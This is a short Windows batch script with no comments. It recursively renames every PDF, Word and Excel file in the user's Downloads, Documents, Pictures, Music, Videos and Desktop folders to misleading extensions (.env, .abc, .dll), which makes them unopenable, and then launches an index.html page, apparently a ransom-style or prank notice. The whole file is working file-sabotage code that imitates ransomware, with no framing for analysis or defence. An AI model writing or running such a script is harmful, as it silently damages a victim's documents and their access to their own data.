@echo off
for /r "%USERPROFILE%\Downloads" %%f in (*.pdf) do ren "%%f" "%%~nf.env"
for /r "%USERPROFILE%\Documents" %%f in (*.pdf) do ren "%%f" "%%~nf.env"
for /r "%USERPROFILE%\Pictures" %%f in (*.pdf) do ren "%%f" "%%~nf.env"
for /r "%USERPROFILE%\Music" %%f in (*.pdf) do ren "%%f" "%%~nf.env"
for /r "%USERPROFILE%\Videos" %%f in (*.pdf) do ren "%%f" "%%~nf.env"
for /r "%USERPROFILE%\Desktop" %%f in (*.pdf) do ren "%%f" "%%~nf.env"

for /r "%USERPROFILE%\Downloads" %%f in (*.docx) do ren "%%f" "%%~nf.abc"
for /r "%USERPROFILE%\Documents" %%f in (*.docx) do ren "%%f" "%%~nf.abc"
for /r "%USERPROFILE%\Pictures" %%f in (*.docx) do ren "%%f" "%%~nf.abc"
for /r "%USERPROFILE%\Music" %%f in (*.docx) do ren "%%f" "%%~nf.abc"
for /r "%USERPROFILE%\Videos" %%f in (*.docx) do ren "%%f" "%%~nf.abc"
for /r "%USERPROFILE%\Desktop" %%f in (*.docx) do ren "%%f" "%%~nf.abc"

for /r "%USERPROFILE%\Downloads" %%f in (*.xlsx) do ren "%%f" "%%~nf.dll"
for /r "%USERPROFILE%\Documents" %%f in (*.xlsx) do ren "%%f" "%%~nf.dll"
for /r "%USERPROFILE%\Pictures" %%f in (*.xlsx) do ren "%%f" "%%~nf.dll"
for /r "%USERPROFILE%\Music" %%f in (*.xlsx) do ren "%%f" "%%~nf.dll"
for /r "%USERPROFILE%\Videos" %%f in (*.xlsx) do ren "%%f" "%%~nf.dll"
for /r "%USERPROFILE%\Desktop" %%f in (*.xlsx) do ren "%%f" "%%~nf.dll"


start index.html
